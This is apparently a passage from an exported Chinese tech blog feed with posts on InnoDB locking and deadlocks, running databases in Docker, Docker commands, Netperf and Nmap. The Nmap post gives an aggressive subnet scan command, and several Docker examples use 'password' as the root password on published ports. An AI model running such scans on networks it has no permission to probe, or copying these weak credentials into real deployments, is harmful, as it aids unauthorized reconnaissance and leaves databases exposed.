</li>
<li>
<p>两个级别</p>
<ul>
<li>InnoDB Row Lock, InnoDB行锁</li>
<li>InnoDB Table Lock, InnoDB表锁</li>
</ul>
</li>
<li>
<p>四种实现形式</p>
<ul>
<li>共享锁</li>
<li>排他锁</li>
<li>意向共享锁</li>
<li>意向排他锁</li>
</ul>
</li>
</ul>
<h3 id="检查InnoDB-Lock状态">检查InnoDB Lock状态</h3>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">02:25:53 (root@localhost) [(none)]&gt; show status like &#x27;innodb_row_lock%&#x27;;</span><br><span class="line">+-------------------------------+-------+</span><br><span class="line">| Variable_name                 | Value |</span><br><span class="line">+-------------------------------+-------+</span><br><span class="line">| Innodb_row_lock_current_waits | 0     |</span><br><span class="line">| Innodb_row_lock_time          | 0     |</span><br><span class="line">| Innodb_row_lock_time_avg      | 0     |</span><br><span class="line">| Innodb_row_lock_time_max      | 0     |</span><br><span class="line">| Innodb_row_lock_waits         | 0     |</span><br><span class="line">+-------------------------------+-------+</span><br><span class="line">5 rows in set (0.00 sec)</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">select * from information_schema.innodb_locks\G</span><br><span class="line">select * from information_schema.innodb_lock_waits\G</span><br><span class="line">select * from information_schema.innodb_trx\G</span><br><span class="line"></span><br><span class="line">-- processlist</span><br><span class="line">SHOW FULL PROCESSLIST;</span><br><span class="line"></span><br><span class="line">SELECT</span><br><span class="line">  `ID`,</span><br><span class="line">  `USER`,</span><br><span class="line">  `HOST`,</span><br><span class="line">  `DB`,</span><br><span class="line">  `COMMAND`,</span><br><span class="line">  `TIME`,</span><br><span class="line">  `STATE`,</span><br><span class="line">  LEFT(`INFO`, 51200) AS `Info`</span><br><span class="line">FROM `information_schema`.`PROCESSLIST`;</span><br></pre></td></tr></table></figure></div>
<h3 id="InnoDB-Row-Lock">InnoDB Row Lock</h3>
<p><strong>InnoDB实现的两种类型行锁</strong></p>
<ul>
<li>S Lock (Shared lock, 共享锁)</li>
<li>X Lock (Exclusive lock, 排他锁)</li>
</ul>
<blockquote>
<p>一般来说，读写操作的锁不同。读锁（或叫共享锁）允许并发线程读取加锁的数据，但禁止写数据。相反，写锁（或叫排他锁）阻止其他线程的读写操作。</p>
</blockquote>
<p><strong>InnoDB行锁的三种算法</strong></p>
<ul>
<li>Record lock</li>
<li>Gap lock</li>
<li>Next-key lock：Record Lock + Gap Lock, 锁定一个范围，并且锁定记录本身</li>
</ul>
<blockquote>
<p>如果不通过索引条件检索数据，那么InnDB将对表中的所有记录加锁，实际效果跟表锁一样！</p>
<p>SQL优化或是检查锁的时候，还需要注意表数据量和相关SQL语句的索引(explain)使用状况。</p>
<p>对于键值在条件范围内但不存在的记录，叫“间隙(GAP)”。</p>
</blockquote>
<h3 id="InnoDB-Table-Lock">InnoDB Table Lock</h3>
<p>InnoDB内部使用的两种表级意向锁(Intention Lock)</p>
<ul>
<li>IS, Intention Share Lock, 意向共享锁</li>
<li>IX, Intention Exclusive Lock, 意向排他锁</li>
</ul>
<h3 id="其他锁">其他锁</h3>
<p>InnoDB互斥和循环锁</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">select * from performance_schema.mutex_instances where locked_by_thread_id is not null\G</span><br></pre></td></tr></table></figure></div>
<h2 id="Deadlock">Deadlock</h2>
<blockquote>
<p>Deadlocks are a classic problem in transactional databases, but they are not dangerous unless they are so frequent that you cannot run certain transactions at all.</p>
<p>死锁，是指当两个或多个竞争事务彼此等待对方释放锁，造成循环锁等待，从而导致事务永远无法终止的情况。</p>
</blockquote>
<p>产生原因：</p>
<ol>
<li>数据冲突</li>
<li>由于存储引擎的实现方式导致的</li>
</ol>
<h3 id="innodb-lock-wait-timeout">innodb_lock_wait_timeout</h3>
<p>锁等待超时参数</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">08:28:32 (root@localhost) [test]&gt; show global variables like &#x27;innodb_lock_wait_timeout&#x27;;</span><br><span class="line">+--------------------------+-------+</span><br><span class="line">| Variable_name            | Value |</span><br><span class="line">+--------------------------+-------+</span><br><span class="line">| innodb_lock_wait_timeout | 50    |</span><br><span class="line">+--------------------------+-------+</span><br><span class="line">1 row in set (0.00 sec)</span><br></pre></td></tr></table></figure></div>
<h3 id="其他关注点">其他关注点</h3>
<h4 id="InnoDB引擎事务隔离级别">InnoDB引擎事务隔离级别</h4>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">08:50:14 (root@localhost) [test]&gt; select @@tx_isolation;</span><br><span class="line">+----------------+</span><br><span class="line">| @@tx_isolation |</span><br><span class="line">+----------------+</span><br><span class="line">| READ-COMMITTED |</span><br><span class="line">+----------------+</span><br><span class="line">1 row in set (0.00 sec)</span><br></pre></td></tr></table></figure></div>
<h4 id="锁冲突引发死锁">锁冲突引发死锁</h4>
<h4 id="Explicit-Row-Locks">Explicit Row Locks</h4>
<ul>
<li>LOCK IN SHARE MODE</li>
<li>FOR UPDATE</li>
</ul>
<h4 id="Implicit-Locks">Implicit Locks</h4>
<blockquote>
<p>No lock unless SERIALIZABLE level, LOCK IN SHARE MODE, or FOR UPDATE is used.</p>
</blockquote>
<h2 id="Reference">Reference</h2>
<ul>
<li><a class="link"   href="https://bugs.mysql.com/bug.php?id=989" >https://bugs.mysql.com/bug.php?id=989 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></li>
<li>MySQL排错指南 Chapter 2</li>
<li>深入浅出MySQL Chapter 20 锁问题</li>
<li>深入浅出MySQL Chapter 20.3.9 关于死锁</li>
<li><a class="link"   href="https://dev.mysql.com/doc/refman/5.7/en/innodb-deadlock-detection.html" >https://dev.mysql.com/doc/refman/5.7/en/innodb-deadlock-detection.html <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></li>
<li><a class="link"   href="https://dev.mysql.com/doc/refman/5.7/en/innodb-locking.html" >https://dev.mysql.com/doc/refman/5.7/en/innodb-locking.html <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></li>
</ul>
<h2 id="Footnotes">Footnotes</h2>
<hr class="footnotes-sep">
<section class="footnotes">
<ol class="footnotes-list">
<li id="fn1" class="footnote-item"><p><a href="https://shawnyan.cn/2018/docker/docker-with-mysql-mariadb">https://shawnyan.cn/2018/docker/docker-with-mysql-mariadb</a> <a href="#fnref1" class="footnote-backref">↩︎</a></p>
</li>
</ol>
</section>
]]></content>
      <categories>
        <category>MySQL</category>
      </categories>
      <tags>
        <tag>mariadb</tag>
        <tag>mysql</tag>
        <tag>lock</tag>
        <tag>innodb</tag>
      </tags>
  </entry>
  <entry>
    <title>在Docker上运行Oracle Database</title>
    <url>/2018/docker/docker-with-oracle/</url>
    <content><![CDATA[<p>Run OracleDatabase on Docker</p>
<h2 id="Info">Info</h2>
<blockquote>
<p>Oracle Database 11.2.0.2 XE</p>
<p>host swap space size need more than 2048M</p>
</blockquote>
<h2 id="Step">Step</h2>
<ul>
<li>拉取基础镜像</li>
</ul>
<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">docker pull oraclelinux:7-slim</span><br></pre></td></tr></table></figure></div>
<ul>
<li>下载xe安装包</li>
</ul>
<div class="highlight-container" data-rel="Html"><figure class="iseeu highlight html"><table><tr><td class="code"><pre><span class="line">http://download.oracle.com/otn/linux/oracle11g/xe/oracle-xe-11.2.0-1.0.x86_64.rpm.zip</span><br></pre></td></tr></table></figure></div>
<p><strong>IMPORTANT:</strong> You will have to provide the installation binaries of Oracle Database and put them into the <code>dockerfiles/&lt;version&gt;</code> folder.</p>
<ul>
<li><a class="link"   href="https://github.com/oracle/docker-images/tree/master/OracleDatabase" >定制镜像 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></li>
</ul>
<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">cd</span> OracleDatabase/dockerfiles</span><br><span class="line">./buildDockerImage.sh -v 11.2.0.2 -x</span><br></pre></td></tr></table></figure></div>
<ul>
<li>运行docker</li>
</ul>
<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">docker run --name &lt;container name&gt; \</span><br><span class="line">--shm-size=1g \</span><br><span class="line">-p 1521:1521 -p 8080:8080 \</span><br><span class="line">-e ORACLE_PWD=&lt;your database passwords&gt; \</span><br><span class="line">-v [&lt;host mount point&gt;:]/u01/app/oracle/oradata \</span><br><span class="line">oracle/database:11.2.0.2-xe</span><br></pre></td></tr></table></figure></div>
<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">docker run --name oracle11g \</span><br><span class="line">--shm-size=1g \</span><br><span class="line">-p 1521:1521 -p 8080:8080 \</span><br><span class="line">-e ORACLE_PWD=password \</span><br><span class="line">-v /u01/app/oracle/oradata \</span><br><span class="line">oracle/database:11.2.0.2-xe</span><br></pre></td></tr></table></figure></div>
]]></content>
      <categories>
        <category>Docker</category>
      </categories>
      <tags>
        <tag>docker</tag>
        <tag>oracle</tag>
      </tags>
  </entry>
  <entry>
    <title>在Docker上运行MongoDB</title>
    <url>/2018/docker/docker-with-mongodb/</url>
    <content><![CDATA[<h2 id="Run-MongoDB-on-Docker">Run MongoDB on Docker</h2>
<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># run</span></span><br><span class="line">docker run --name mongo34 -p 27017:27017 -d mongo:3.4</span><br><span class="line"><span class="comment"># connect</span></span><br><span class="line">docker <span class="built_in">exec</span> -it mongo34 mongo admin</span><br><span class="line"><span class="comment"># create user</span></span><br><span class="line">db.createUser(&#123; user: <span class="string">&#x27;shawnyan&#x27;</span>, <span class="built_in">pwd</span>: <span class="string">&#x27;password&#x27;</span>, roles: [ &#123; role: <span class="string">&quot;userAdminAnyDatabase&quot;</span>, db: <span class="string">&quot;admin&quot;</span> &#125; ] &#125;);</span><br></pre></td></tr></table></figure></div>
<h2 id="Reference">Reference</h2>
<ul>
<li><a class="link"   href="https://github.com/docker-library/mongo" >https://github.com/docker-library/mongo <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></li>
<li><a class="link"   href="https://hub.docker.com/_/mongo/" >https://hub.docker.com/_/mongo/ <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></li>
</ul>
]]></content>
      <categories>
        <category>Docker</category>
      </categories>
      <tags>
        <tag>docker</tag>
        <tag>mongodb</tag>
      </tags>
  </entry>
  <entry>
    <title>在Docker上运行MySQL和MariaDB</title>
    <url>/2018/docker/docker-with-mysql-mariadb/</url>
    <content><![CDATA[<h2 id="Run-MySQL-on-Docker">Run MySQL on Docker</h2>
<ul>
<li>ol7_mysql56</li>
</ul>
<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># build</span></span><br><span class="line">docker build --<span class="built_in">rm</span> --no-cache=<span class="literal">true</span> -t <span class="string">&quot;shawnyan/docker:mysql56&quot;</span> .</span><br><span class="line"><span class="comment"># run</span></span><br><span class="line">docker run --name mysql56 -p 33316:3306 -e MYSQL_ROOT_PASSWORD=password -d shawnyan/docker:mysql56</span><br><span class="line"><span class="comment"># connect</span></span><br><span class="line">docker <span class="built_in">exec</span> -it mysql56 mysql -uroot -p</span><br></pre></td></tr></table></figure></div>
<ul>
<li>ol7_mysql57</li>
</ul>
<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># build</span></span><br><span class="line"><span class="comment">#docker build --rm --no-cache=true -t &quot;shawnyan/docker:mysql57&quot; .</span></span><br><span class="line"><span class="comment"># run</span></span><br><span class="line"><span class="comment">#docker run --name my-container-name -e MYSQL_ROOT_PASSWORD=my-secret-pw -d mysql/mysql-server:tag</span></span><br><span class="line">docker run --name mysql57 -p 33306:3306 -e MYSQL_ROOT_PASSWORD=password -d shawnyan/docker:mysql57</span><br><span class="line"><span class="comment"># connect</span></span><br><span class="line">docker <span class="built_in">exec</span> -it mysql57 mysql -uroot -p</span><br></pre></td></tr></table></figure></div>
<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># pull</span></span><br><span class="line">docker pull mysql:5.7</span><br><span class="line"><span class="comment"># run</span></span><br><span class="line">docker run --name mysql57 -p 33306:3306 -e MYSQL_ROOT_PASSWORD=password -d mysql:5.7</span><br><span class="line"><span class="comment"># connect</span></span><br><span class="line">docker <span class="built_in">exec</span> -it mysql57 mysql -uroot -p</span><br></pre></td></tr></table></figure></div>
<p><img  
                     lazyload
                     src="/img/loading.svg"
                     data-src="/2018/docker/docker-with-mysql-mariadb/a12-img-01.png"
                      alt="" loading="lazy"
                ></p>
<h2 id="Run-MariaDB-on-Docker">Run MariaDB on Docker</h2>
<ul>
<li>docker-mariadb-10.1</li>
</ul>
<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># pull</span></span><br><span class="line">docker pull mariadb:10.1</span><br><span class="line"><span class="comment"># run</span></span><br><span class="line">docker run --name mariadb101 -p 33326:3306 -e MYSQL_ROOT_PASSWORD=password -d mariadb:10.1</span><br><span class="line"><span class="comment"># connect</span></span><br><span class="line">docker <span class="built_in">exec</span> -it mariadb101 mysql -uroot -p</span><br></pre></td></tr></table></figure></div>
<ul>
<li>docker-mariadb-10.2</li>
</ul>
<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># pull</span></span><br><span class="line">docker pull mariadb:10.2</span><br><span class="line"><span class="comment"># run</span></span><br><span class="line">docker run --name mariadb102 -p 33336:3306 -e MYSQL_ROOT_PASSWORD=password -d mariadb:10.2</span><br><span class="line"><span class="comment"># connect</span></span><br><span class="line">docker <span class="built_in">exec</span> -it mariadb102 mysql -uroot -p</span><br></pre></td></tr></table></figure></div>
<p><img  
                     lazyload
                     src="/img/loading.svg"
                     data-src="/2018/docker/docker-with-mysql-mariadb/a12-img-02.png"
                      alt="" loading="lazy"
                ></p>
<h2 id="Reference">Reference</h2>
<ul>
<li><a class="link"   href="https://github.com/mysql/mysql-docker" >https://github.com/mysql/mysql-docker <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></li>
<li><a class="link"   href="https://dev.mysql.com/doc/refman/5.7/en/linux-installation-docker.html" >https://dev.mysql.com/doc/refman/5.7/en/linux-installation-docker.html <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></li>
<li><a class="link"   href="https://github.com/docker-library/mariadb" >https://github.com/docker-library/mariadb <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></li>
<li><a class="link"   href="https://hub.docker.com/_/mariadb/" >https://hub.docker.com/_/mariadb/ <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></li>
</ul>
]]></content>
      <categories>
        <category>Docker</category>
      </categories>
      <tags>
        <tag>docker</tag>
        <tag>mariadb</tag>
        <tag>mysql</tag>
      </tags>
  </entry>
  <entry>
    <title>Docker常用命令</title>
    <url>/2018/docker/docker-usage/</url>
    <content><![CDATA[<p>Docker Usage</p>
<blockquote>
<p>docker的四种状态(start/pause/restart/stop)</p>
</blockquote>
<ul>
<li>基础命令</li>
</ul>
<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">docker info</span><br><span class="line">docker search</span><br></pre></td></tr></table></figure></div>
<ul>
<li>拉取镜像</li>
</ul>
<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">docker pull</span><br><span class="line">docker pull centos:7.3.1611</span><br></pre></td></tr></table></figure></div>
<ul>
<li>容器状态</li>
</ul>
<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># start</span></span><br><span class="line">docker start happy_hahaha</span><br><span class="line"><span class="comment"># restart</span></span><br><span class="line">docker restart happy_hahaha</span><br><span class="line"><span class="comment"># stop</span></span><br><span class="line">docker stop happy_hahaha</span><br><span class="line"><span class="comment"># pause</span></span><br><span class="line">docker pause happy_hahaha</span><br><span class="line">docker unpause happy_hahaha</span><br></pre></td></tr></table></figure></div>
<ul>
<li>运行容器</li>
</ul>
<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># docker run</span></span><br><span class="line">docker run --name centos7.3 -i -t centos:7.3.1611 /bin/bash</span><br><span class="line"><span class="comment"># --detach =&gt; -d</span></span><br><span class="line">docker run --name centos7.3_d -i -t -d centos:7.3.1611 /bin/bash</span><br><span class="line"><span class="comment"># 自动重启</span></span><br><span class="line">docker run --restart=always</span><br><span class="line"><span class="comment"># 挂载数据卷</span></span><br><span class="line">docker run --<span class="built_in">rm</span> -it -v /host/data/:/data:rw happy_hahaha /bin/bash</span><br><span class="line">docker run --name centos7.3-elk -dit -v /Volumes/HDD/dockerdata:/data:rw -p 8080:80 -p 5601:5601 -p 9200:9200 --privileged=<span class="literal">true</span> shawnyan/docker:centos7.3.1611 /usr/sbin/init</span><br><span class="line"><span class="comment"># rename</span></span><br><span class="line">docker rename centos7.3 centos7.3.1611</span><br></pre></td></tr></table></figure></div>
<ul>
<li>容器交互</li>
</ul>
<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">docker <span class="built_in">exec</span> -t -i centos7.3 /bin/bash</span><br><span class="line">docker <span class="built_in">exec</span> -it centos7.3 /bin/bash</span><br></pre></td></tr></table></figure></div>
<ul>
<li>查看镜像</li>
</ul>
<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">docker images</span><br><span class="line">docker images shawnyan/docker</span><br><span class="line">docker image <span class="built_in">ls</span> -a</span><br><span class="line">docker image <span class="built_in">rm</span> &lt;CONTAINER ID&gt;</span><br><span class="line">docker image <span class="built_in">rm</span> `docker image <span class="built_in">ls</span> -a -q`</span><br><span class="line"><span class="comment"># 构建镜像的每一层</span></span><br><span class="line">docker <span class="built_in">history</span> &lt;<span class="built_in">id</span>&gt;</span><br></pre></td></tr></table></figure></div>
<ul>
<li>删除容器</li>
</ul>
<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">docker <span class="built_in">rm</span> &lt;CONTAINER ID&gt;</span><br><span class="line">docker <span class="built_in">rm</span> `docker ps -a -q`</span><br></pre></td></tr></table></figure></div>
<ul>
<li>监控容器</li>
</ul>
<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">docker ps</span><br><span class="line">docker ps -a</span><br><span class="line">docker container <span class="built_in">ls</span> -a</span><br><span class="line"><span class="comment"># status</span></span><br><span class="line">docker stats centos7.3</span><br><span class="line">docker logs centos7.3</span><br><span class="line">docker logs -ft centos7.3</span><br></pre></td></tr></table></figure></div>
<ul>
<li>查看容器信息</li>
</ul>
<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># In Liquid format double &#x27;&#123;&#125;&#x27; means variables.</span></span><br><span class="line">docker inspect centos7.3</span><br><span class="line"><span class="comment"># docker inspect centos7.3 --format=&#x27;\&#123;\&#123; .ID \&#125;\&#125;&#x27;</span></span><br><span class="line"><span class="comment"># docker inspect centos7.3 --format=&#x27;\&#123;\&#123; .NetworkSettings.IPAddress \&#125;\&#125;&#x27;</span></span><br><span class="line"><span class="comment"># docker inspect centos7.3 --format=&#x27;\&#123;\&#123; .State.Status \&#125;\&#125;&#x27;</span></span><br></pre></td></tr></table></figure></div>
<ul>
<li>导出导入镜像</li>
</ul>
<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># export</span></span><br><span class="line">docker save -o ol7.tar oraclelinux:7-slim</span><br><span class="line"><span class="comment"># import</span></span><br><span class="line">docker load -i ol7.tar</span><br></pre></td></tr></table></figure></div>
<ul>
<li>提交定制容器</li>
</ul>
<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">docker commit -m <span class="string">&quot;comment&quot;</span> &lt;CONTAINER ID&gt; &lt;user/repo&gt;</span><br><span class="line">docker commit -m <span class="string">&quot;centos7.3 core&quot;</span> -a <span class="string">&quot;shawnyan&quot;</span> e819c4cb23a4 shawnyan/docker:centos7.3</span><br><span class="line">docker commit -m <span class="string">&quot;centos7_v2&quot;</span> -a <span class="string">&quot;shawnyan&quot;</span> centos7 shawnyan/docker:centos7_v2</span><br></pre></td></tr></table></figure></div>
<ul>
<li>推送镜像</li>
</ul>
<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">docker push &lt;user/repo:tag&gt;</span><br></pre></td></tr></table></figure></div>
]]></content>
      <categories>
        <category>Docker</category>
      </categories>
      <tags>
        <tag>centos</tag>
        <tag>docker</tag>
        <tag>command</tag>
      </tags>
  </entry>
  <entry>
    <title>Docker 书单</title>
    <url>/2018/docker/docker-books/</url>
    <content><![CDATA[<p>Docker book list.</p>
<ul>
<li>[x] THE DOCKER BOOK(第一本Docker书) v1.9.1
<ul>
<li><a class="link"   href="https://github.com/turnbullpress/dockerbook-code" >https://github.com/turnbullpress/dockerbook-code <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></li>
</ul>
</li>
<li>[x] docker in action(Docker实战)
<ul>
<li><a class="link"   href="https://github.com/dockerinaction" >https://github.com/dockerinaction <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></li>
<li><a class="link"   href="https://hub.docker.com/u/dockerinaction/dockerInAction.md" >https://hub.docker.com/u/dockerinaction/dockerInAction.md <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></li>
</ul>
</li>
<li>[ ] Docker进阶与实战 / 华为</li>
<li>[ ] 微服务架构与实践</li>
<li>[ ] <a class="link"   href="https://www.gitbook.com/book/yeasy/docker_practice/details" >Docker技术入门与实战 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></li>
</ul>
]]></content>
      <categories>
        <category>Docker</category>
      </categories>
      <tags>
        <tag>docker</tag>
        <tag>book</tag>
      </tags>
  </entry>
  <entry>
    <title>关于Docker</title>
    <url>/2018/docker/docker-intro/</url>
    <content><![CDATA[<p>Something about docker.</p>
<p>“Build, Ship and Run”</p>
<h2 id="内核容器">内核容器</h2>
<ul>
<li><a class="link"   href="https://github.com/lxc/lxc" >LXC <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></li>
<li>Linux Container, 内核容器技术</li>
<li>Cgroup, Namespace, rootfs</li>
</ul>
<h2 id="容器文件系统">容器文件系统</h2>
<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 控制文件系统根目录的位置</span></span><br><span class="line"><span class="built_in">chroot</span></span><br><span class="line"><span class="comment"># 文件系统访问和结构</span></span><br><span class="line">MNT</span><br></pre></td></tr></table></figure></div>
<h2 id="镜像的叠加">镜像的叠加</h2>
<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">docker <span class="built_in">history</span> shawnyan/docker:ol7</span><br></pre></td></tr></table></figure></div>
<h2 id="Docker-Hub">Docker Hub</h2>
<p><a class="link"   href="https://hub.docker.com/" >公有仓库 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>/私有仓库</p>
<p>在CentOS上安装docker-registry</p>
<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">docker run -d -e SETTINGS_FLAVOR=dev -e STORAGE_PATH=/tmp/registry -v /opt/data/registry:/tmp/registry  -p 5000:5000 registry</span><br></pre></td></tr></table></figure></div>
<p>私有仓库位置：/opt/data/registry</p>
<p>可以把项目<code>https://github.com/docker/docker-registry.git</code>克隆到本地</p>
<h2 id="Docker-Tools">Docker Tools</h2>
<ul>
<li><a class="link"   href="https://github.com/justone/dockviz" >dockviz <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></li>
</ul>
<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">dockviz images -d | dot -Tpng -o images.png</span><br></pre></td></tr></table></figure></div>
<ul>
<li>Docker Compose</li>
</ul>
<p>docker-compose.yml</p>
<ul>
<li>Docker Machine</li>
</ul>
<p>Docker ToolBox host ip</p>
<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">docker-machine ip</span><br><span class="line">docker-machine <span class="built_in">ls</span></span><br></pre></td></tr></table></figure></div>
<ul>
<li>Swarm</li>
</ul>
<p>Docker集群</p>
<p>“swap, plug and play”</p>
<h2 id="Reference">Reference</h2>
<ul>
<li><a class="link"   href="https://store.docker.com/editions/community/docker-ce-desktop-mac" >docker-ce-desktop-mac <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></li>
<li><a class="link"   href="https://docs.docker.com/reference/" >reference <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></li>
<li><a class="link"   href="https://docs.docker.com/engine/userguide/" >userguide <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></li>
<li><a class="link"   href="https://docs.docker.com/engine/reference/run/" >Docker run reference <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></li>
<li><a class="link"   href="https://github.com/jpetazzo/dind" >docker-in-docker <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></li>
<li><a class="link"   href="https://github.com/dockerfile/" >Dockerfile <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></li>
<li><a class="link"   href="https://github.com/docker/distribution" >docker/distribution <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></li>
</ul>
]]></content>
      <categories>
        <category>Docker</category>
      </categories>
      <tags>
        <tag>docker</tag>
        <tag>concept</tag>
      </tags>
  </entry>
  <entry>
    <title>测试工具 Netperf</title>
    <url>/2018/testing/testing-tool-netperf/</url>
    <content><![CDATA[<p><strong>Netperf</strong> 是一种网络性能的测量工具，主要针对基于TCP或UDP的传输。Netperf工具以client/server方式工作。server端是netserver，用来侦听来自client端的连接，client端是netperf，用来向server发起网络测试。测试过程中，在服务器上运行serverperf，同时在客户端上运行netperf。</p>
<h2 id="Usage">Usage</h2>
<p>在服务器上执行同样操作，将netperf安装到服务器上，</p>
<p>cd src 查看命令</p>
<p>运行：<code>./netserver</code></p>
<p>在客户端上同样安装完成后运行：<code>./netperf -H 服务器IP</code></p>
<p>netperf 命令这里我们只解释那些常用的命令行参数：</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">-H host ：指定远端运行netserver的server IP地址。</span><br><span class="line"></span><br><span class="line">-l testlen：指定测试的时间长度（秒）</span><br><span class="line"></span><br><span class="line">-t testname：指定进行的测试类型，包括TCP_STREAM，UDP_STREAM，TCP_RR，TCP_CRR，UDP_RR</span><br></pre></td></tr></table></figure></div>
<h2 id="Reference">Reference</h2>
<ul>
<li><a class="link"   href="https://hewlettpackard.github.io/netperf/" >netperf-homepage <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></li>
<li><a class="link"   href="https://help.aliyun.com/knowledge_detail/55757.html" >网络性能测试方法 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></li>
<li><a class="link"   href="https://help.aliyun.com/document_detail/58625.html" >物理专线网络性能测试方法 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></li>
</ul>
]]></content>
      <categories>
        <category>Testing</category>
      </categories>
      <tags>
        <tag>testing</tag>
        <tag>netperf</tag>
      </tags>
  </entry>
  <entry>
    <title>测试工具 Nmap</title>
    <url>/2018/testing/testing-tool-nmap/</url>
    <content><![CDATA[<p><strong>Nmap</strong> 是一款用于网络发现和安全审计的网络安全工具。</p>
<h2 id="Install">Install</h2>
<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">bzip2 -<span class="built_in">cd</span> nmap-7.12.tar.bz2 | tar xvf -</span><br><span class="line"><span class="built_in">cd</span> nmap-7.12</span><br><span class="line">./configure</span><br><span class="line">make</span><br><span class="line">su root</span><br><span class="line">make install</span><br></pre></td></tr></table></figure></div>
<h2 id="usage">usage</h2>
<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">sudo nmap -T4 -A -v 192.168.1.1/24</span><br></pre></td></tr></table></figure></div>
<p>这些是上述命令的参数选项符。</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">T4 ─ 将时间设为4(0-5，5代表最快)</span><br><span class="line">A  ─ 启用操作系统检测</span><br><span class="line">v  ─ 详细输出</span><br></pre></td></tr></table></figure></div>
<h2 id="Reference">Reference</h2>
<ul>
<li><a class="link"   href="https://nmap.org/" >nmap.org <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></li>
